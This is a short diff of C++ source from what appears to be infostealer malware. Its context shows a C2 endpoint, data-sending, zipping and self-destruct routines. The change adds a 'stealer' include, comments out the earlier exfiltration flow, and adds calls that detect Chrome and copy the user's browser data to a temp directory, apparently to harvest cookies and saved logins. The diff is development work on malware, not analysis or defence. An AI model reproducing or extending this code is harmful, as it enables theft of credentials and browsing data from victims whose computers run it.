@@ -7,7 +7,7 @@
 #include "Core/zipping.hpp"
 #include "Core/names.hpp"
 #include "Communication/senddata.hpp"
-
+#include "Core/stealer.hpp"
 
 std::string zipDestStr;
 std::wstring C2;
@@ -65,7 +65,8 @@ void GenZip() {
 }
 
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int main() {
+    /*
     std::wstring uid;
     std::string pubDir = PublicDir();
     std::string zipFile = pubDir + "zipped.zip";
@@ -149,6 +150,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         Cleanup();
         Sleep(2000);
         SelfDestruct();
+    }
+    */
+
+    if (CheckChrome()) {
+        CopyBrowserDataToTemp();
+    }
+    else {
+        std::cout << "The Chrome data directory does not exist for the current user." << std::endl;
     }
 
     return 0;
